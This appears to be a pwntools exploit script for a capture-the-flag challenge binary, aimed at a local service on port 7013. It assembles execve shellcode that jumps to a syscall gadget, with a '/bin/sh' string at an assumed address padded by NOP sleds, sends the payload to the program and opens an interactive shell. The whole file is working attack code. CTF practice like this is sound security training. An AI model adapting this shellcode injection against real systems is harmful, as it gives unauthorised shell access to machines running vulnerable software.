#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

HOST = '127.0.0.1'
PORT = 7013

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
    	return remote(HOST, PORT, level='debug')
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# FORTIFY:    Enabled
# Stripped:   No

io = start()

syscall = 0x000000000000155a
sc = asm('''
	sub r15, 0x1120
	add r15, {}
	mov rdi, 0xdeadb000
	add rdi, 99
	mov rax, 0x3b
	jmp r15
'''.format(syscall))

sc += b'\x90' * (90 - len(sc))
sc += b'/bin/sh\x00\x90'

io.sendlineafter(b'): ',str(len(sc)).encode())
io.sendafter(b'\n', sc)
io.recv()
io.interactive()

